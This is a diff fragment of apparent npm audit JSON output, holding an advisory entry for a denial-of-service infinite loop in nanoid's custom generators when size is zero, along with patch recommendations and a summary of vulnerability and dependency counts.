+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-67213\n- https://github.com/ai/nanoid/commit/cb3626d0f3342fdf179cd425fd9c4fbb92c7d0e7\n- https://github.com/ai/nanoid/releases/tag/5.1.6\n- https://www.vulncheck.com/advisories/nanoid-before-infinite-loop-via-zero-size-in-customalphabet-and-customrandom\n- https://github.com/ai/nanoid/commit/f9d13f150847d117877adee3460a46eceb0cf49b\n- https://github.com/ai/nanoid/releases/tag/3.3.17\n- https://github.com/advisories/GHSA-2v37-7h3g-55p8",
+      "created": "2026-07-29T15:31:12.000Z",
+      "id": 1138813,
+      "npm_advisory_id": null,
+      "overview": "nanoid (Nano ID) before 5.1.6 contains an infinite loop in the customAlphabet and customRandom functions. When these functions are configured with a size of 0, the internal generation loop never satisfies its exit condition and spins indefinitely, hanging the calling thread. An application that passes an unvalidated, attacker-controlled size of 0 to these functions is exposed to a denial-of-service condition.",
+      "reported_by": null,
+      "title": "nanoid: custom generators can loop indefinitely when size is zero",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-67213"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "nanoid",
+      "vulnerable_versions": "<3.3.17",
+      "github_advisory_id": "GHSA-2v37-7h3g-55p8",
+      "recommendation": "Upgrade to version 3.3.17 or later",
+      "patched_versions": ">=3.3.17",
+      "updated": "2026-08-07T20:50:35.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-2v37-7h3g-55p8"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 7,
+      "moderate": 28,
+      "high": 8,
+      "critical": 0
+    },
+    "dependencies": 3951,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 3951
+  }
+}
